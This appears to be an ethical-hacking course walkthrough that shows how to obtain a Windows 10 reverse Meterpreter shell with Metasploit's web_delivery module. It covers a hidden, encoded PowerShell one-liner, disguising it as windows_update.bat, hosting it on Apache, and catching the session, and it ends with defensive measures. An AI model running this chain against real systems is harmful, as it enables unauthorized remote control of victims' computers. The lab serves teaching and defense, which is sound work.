# Practical 9 — Hacking Windows 10 via PowerShell (Metasploit `web_delivery`)

> **Lab exercise for an authorized cybersecurity / ethical hacking course.** This walkthrough demonstrates how an attacker can generate a malicious PowerShell one-liner using Metasploit's `web_delivery` module, wrap it in a `.bat` file, host it on a web server, and obtain a reverse Meterpreter session when a victim on a vulnerable Windows 10 machine executes it. The goal is to understand the attack chain so it can be detected and defended against.

---

## ⚠️ Legal & Ethical Disclaimer

This material is provided **strictly for educational purposes** inside a controlled lab environment (isolated VMs, your own hardware, or a CTF-style range you have explicit permission to use).

- **Do not** run this against any machine, network, person, or organization without **written authorization**.
- Unauthorized access to computer systems is a criminal offense under the IT Act, 2000 (India), the Computer Fraud and Abuse Act (US), the Computer Misuse Act (UK), and similar laws in other jurisdictions.
- The author and contributors take **no responsibility** for misuse of this content.

If you are not sure whether a test is authorized, **stop** and ask a supervisor or the system owner first.

---

## 📚 Background

`exploit/multi/script/web_delivery` is a Metasploit module that hosts a small script on an attacker-controlled web server. When the victim runs the corresponding one-liner (PowerShell, Python, PHP, etc.) on their machine, the script is downloaded and executed in memory, and a reverse shell is returned to the attacker.

This is a **client-side attack** — the victim must execute the payload (typically through social engineering). It's a useful example because:

- It relies on a legitimate, signed Windows binary (`powershell.exe`) — a classic **LOLBin** technique.
- The payload runs **in memory**, so it leaves few on-disk artifacts.
- Detection has to happen at the behavioral level (process tree, command-line arguments, outbound connections), not just antivirus signatures.

The high-level chain in this practical:

1. The attacker configures `web_delivery` with a PowerShell target and reverse Meterpreter payload.
2. Metasploit hosts the staging script and prints a PowerShell one-liner.
3. The attacker wraps that one-liner in a `windows_update.bat` file and serves it via Apache.
4. The victim downloads and double-clicks the `.bat` file.
5. PowerShell fetches the second-stage payload and a Meterpreter session opens on the attacker.

---

## 🧰 Lab Setup

| Role | Suggested OS | Notes |
|---|---|---|
| Attacker | Kali Linux (latest) | Metasploit Framework + Apache2 pre-installed |
| Target | Windows 10 VM | Defender disabled / in lab mode for the exercise |
| Network | Host-only or NAT'd VirtualBox / VMware network | Both VMs must be able to reach each other |

**Verify connectivity first:**

```bash
# From the attacker VM
ping <target-ip>
ip a               # note the attacker's IP for SRVHOST / LHOST
```

---

## 🚀 Steps

### Step 1 — Start Metasploit and search for `web_delivery`

```bash
msfconsole
```

```
msf6 > search web_delivery
```

You should see `exploit/multi/script/web_delivery` in the results.

### Step 2 — Load the exploit and inspect its options

```
msf6 > use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > show options
```

Read each option — particularly `SRVHOST`, `SRVPORT`, `URIPATH`, and `TARGET`.

### Step 3 — Set `SRVHOST` and `URIPATH`

Since this is a client-side attack, `SRVHOST` is the attacker's IP that the victim must be able to reach.

```
msf6 exploit(...) > set SRVHOST <attacker-ip>
msf6 exploit(...) > set URIPATH /
```

Setting `URIPATH` to `/` keeps the generated URL short and clean.

### Step 4 — Remove the default payload

By default the module sets a **Python** payload. Since we're targeting Windows PowerShell, unset it:

```
msf6 exploit(...) > show options
msf6 exploit(...) > unset payload
```

### Step 5 — Pick the PowerShell target and set the Windows payload

List the available targets:

```
msf6 exploit(...) > show targets
```

You'll see entries like `Python`, `PHP`, `PSH` (PowerShell), `Regsvr32`, etc.

```
msf6 exploit(...) > set TARGET 2          # PSH (number may vary — confirm with `show targets`)
msf6 exploit(...) > set PAYLOAD windows/meterpreter/reverse_tcp
msf6 exploit(...) > set LHOST <attacker-ip>
msf6 exploit(...) > set LPORT 4444
```

### Step 6 — Launch the exploit / handler

```
msf6 exploit(...) > exploit
```

Metasploit prints something like:

```
[*] Started reverse TCP handler on <attacker-ip>:4444
[*] Using URL: http://<attacker-ip>:8080/
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e <BASE64_BLOB>
```

**Copy that `powershell.exe ...` one-liner** — it's the code the target needs to run.

### Step 7 — Wrap the one-liner in a `.bat` file

On the attacker machine:

```bash
sudo nano /var/www/html/windows_update.bat
```

Paste the one-liner Metasploit gave you, save, and exit. The file content will look roughly like:

```bat
@echo off
powershell.exe -nop -w hidden -e <BASE64_BLOB>
```

The filename `windows_update.bat` is chosen to look legitimate as part of the social-engineering scenario.

### Step 8 — Start Apache to host the `.bat`

```bash
sudo systemctl start apache2
sudo systemctl status apache2     # confirm it's running
```

Test from the attacker's browser:

```
http://<attacker-ip>/windows_update.bat
```

It should prompt to download the file.

### Step 9 — Deliver the link to the target

Refer back to Practical 7 for the link-masking / phishing-page technique. In a lab, simply browsing to:

```
http://<attacker-ip>/windows_update.bat
```

from the target VM and saving the file is enough.

### Step 10 — Catch the session

When the target double-clicks `windows_update.bat`:

1. `cmd.exe` runs the `powershell.exe -nop -w hidden -e ...` line.
2. PowerShell decodes the Base64 and fetches the stager from Metasploit's HTTP server.
3. The stager pulls down the Meterpreter payload in memory.
4. A new session lands on the attacker:

```
[*] Sending stage (...) to <target-ip>
[*] Meterpreter session 1 opened (<attacker-ip>:4444 -> <target-ip>:xxxxx)
```

Switch to it:

```
msf6 exploit(...) > sessions -i 1
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ipconfig
```

End cleanly when done:

```
meterpreter > exit
```

---

## 🛡️ Defensive Takeaways

This practical is only useful if you take the defender's view back to your day job:

- **Constrained Language Mode** for PowerShell — limits what attacker scripts can do.
- **PowerShell logging:** enable Script Block Logging, Module Logging, and Transcription. The Base64 blob and decoded contents will land in Event ID 4104.
- **AMSI** (Antimalware Scan Interface) inspects PowerShell content at runtime — keep Defender / your EDR enabled and updated.
- **Application control** (WDAC / AppLocker) — block `.bat`, `.hta`, `.vbs`, and unsigned scripts from running in user-writable directories.
- **ASR rules** in Microsoft Defender — e.g. "Block execution of potentially obfuscated scripts" and "Block Office applications from creating child processes."
- **Egress filtering** — the reverse shell needs to phone home. Block unexpected outbound traffic from workstations to arbitrary IPs/ports.
- **User awareness** — a `windows_update.bat` downloaded from a random link should never be trusted; real Windows updates don't arrive that way.

---

## 📖 References

- Metasploit `web_delivery` module — <https://docs.metasploit.com/docs/modules/exploit/multi/script/web_delivery.html>
- MITRE ATT&CK — T1059.001 (PowerShell), T1105 (Ingress Tool Transfer), T1218 (System Binary Proxy Execution)
- Microsoft — about_Logging_Windows — <https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows>

---

## 📝 License

Educational use only. See `LICENSE` if included. By using this repository you agree to the disclaimer above.
